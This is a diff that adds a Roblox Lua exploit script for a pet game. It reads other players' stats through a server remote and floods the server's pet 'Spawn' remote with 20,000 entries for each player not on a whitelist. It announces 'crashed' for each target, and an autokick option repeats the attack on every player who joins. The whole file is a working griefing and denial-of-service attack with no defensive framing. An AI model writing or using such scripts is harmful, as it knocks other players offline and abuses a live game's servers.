@@ -1,0 +1,41 @@
+autokick = false
+whitelist = {game.Players.LocalPlayer.Name,'PS1_Index','PS1_lndex','vul1ures','sub1ocus','slade00123','enegeticLevi123','Thundeermaan2','peop123man','1rstarter'}
+
+--//
+function GOS()
+	return workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()
+end
+
+r = workspace.__REMOTES.Game.Pets
+for i,v in pairs(game.Players:GetChildren()) do
+	local user = v.Name
+	if not table.find(whitelist, user) then
+		local ID = GOS()[user].Save.Pets[1].id
+		local ARG = {}
+		for i = 1, 20000 do
+			ARG[#ARG+1]={"Spawn", v, ID}
+		end
+		r:FireServer(ARG)
+		local m = Instance.new('Message',workspace)
+		m.Text='crashed ' .. user
+		game.Debris:AddItem(m,1)
+	end
+end
+
+if autokick == true then
+	game.Players.PlayerAdded:connect(function(v)
+		local user = v.Name
+		if not table.find(whitelist, user) then
+			repeat task.wait(.1) until GOS()[user] and GOS()[user].Save and GOS()[user].Save.Pets and GOS()[user].Save.Pets[1]
+			local ARG = {}
+			local ID = GOS()[user].Save.Pets[1].id
+			for i = 1, 20000 do
+				ARG[#ARG+1]={"Spawn", v, ID}
+			end
+			r:FireServer(ARG)	
+			local m = Instance.new('Message',workspace)
+			m.Text='crashed ' .. user
+			game.Debris:AddItem(m,1)
+		end
+	end)
+end
